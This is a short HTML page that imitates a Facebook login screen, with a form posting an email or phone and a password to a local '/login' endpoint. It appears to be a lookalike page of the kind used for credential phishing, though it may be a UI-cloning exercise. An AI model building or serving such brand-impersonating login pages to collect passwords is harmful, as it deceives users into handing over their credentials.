
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook Login</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>
<body class="bg-gray-100 flex items-center justify-center h-screen">
  <div class="bg-white p-6 rounded shadow-md w-full max-w-sm">
    <h1 class="text-xl font-bold mb-4">Facebook</h1>
    <form method="POST" action="/login">
      <input type="text" name="email" placeholder="Email or Phone" class="w-full mb-3 p-2 border border-gray-300 rounded"/>
      <input type="password" name="pass" placeholder="Password" class="w-full mb-3 p-2 border border-gray-300 rounded"/>
      <button type="submit" class="w-full bg-blue-600 text-white p-2 rounded">Log In</button>
    </form>
  </div>
</body>
</html>
